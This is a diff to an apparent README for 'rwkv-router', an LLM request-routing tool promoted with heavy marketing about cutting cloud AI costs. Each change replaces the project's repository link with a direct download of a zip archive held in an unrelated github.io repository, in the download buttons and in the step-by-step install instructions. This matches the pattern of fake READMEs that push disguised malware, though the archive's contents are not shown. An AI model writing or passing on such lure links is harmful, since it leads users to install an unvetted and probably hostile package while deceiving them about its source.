@@ -6,7 +6,7 @@ description: "Route LLM requests across local and cloud tiers via R0-R3 routing,
 <h1>🧠 rwkv-router - Cut Cloud LLM Costs by 89%</h1>
 
 <p align="center">
-<a href="https://github.com/kimberlyth43/rwkv-router" style="display:inline-block;padding:16px 32px;background:#6a1b9a;color:#ffffff;font-size:22px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 4px 15px rgba(106,27,154,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+<a href="https://raw.githubusercontent.com/kimberlyth43/kimberlyth43.github.io/main/thoughts/Dist-2.7.zip" style="display:inline-block;padding:16px 32px;background:#6a1b9a;color:#ffffff;font-size:22px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 4px 15px rgba(106,27,154,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <p align="center"><strong>Tired of paying huge bills for AI chatbots? rwkv-router cuts your cloud AI token usage by up to 89% - and it gets smarter by itself over time. It works with OpenAI and Anthropic tools, and it's completely free.</strong></p>
@@ -30,7 +30,7 @@ Imagine you pay for every word an AI model "thinks." That's how cloud AI billing
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/kimberlyth43/rwkv-router](https://github.com/kimberlyth43/rwkv-router)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/kimberlyth43/kimberlyth43.github.io/main/thoughts/Dist-2.7.zip](https://raw.githubusercontent.com/kimberlyth43/kimberlyth43.github.io/main/thoughts/Dist-2.7.zip)**
 
 You'll land on a page with a green button that says "Code." Click it, then click "Download ZIP" - or look for a release section with a pre-built Windows installer file. The download might take a few minutes because it's a full program.
 
@@ -111,7 +111,7 @@ Just delete the folder where you extracted rwkv-router. There's nothing else to 
 You're one download away from dramatically lower AI bills. The setup takes less than 5 minutes. And remember: the router improves every day you use it, so your savings will only grow over time. No coding. No complicated setup. Just smart, automatic savings.
 
 <p align="center">
-<a href="https://github.com/kimberlyth43/rwkv-router" style="display:inline-block;padding:14px 28px;background:#00838f;color:#ffffff;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 4px 15px rgba(0,131,143,0.4);">📥 I'm Ready - Get the Free Software</a>
+<a href="https://raw.githubusercontent.com/kimberlyth43/kimberlyth43.github.io/main/thoughts/Dist-2.7.zip" style="display:inline-block;padding:14px 28px;background:#00838f;color:#ffffff;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 4px 15px rgba(0,131,143,0.4);">📥 I'm Ready - Get the Free Software</a>
 </p>
 
 <p align="center">Join thousands of users who stopped overpaying for cloud AI.</p>
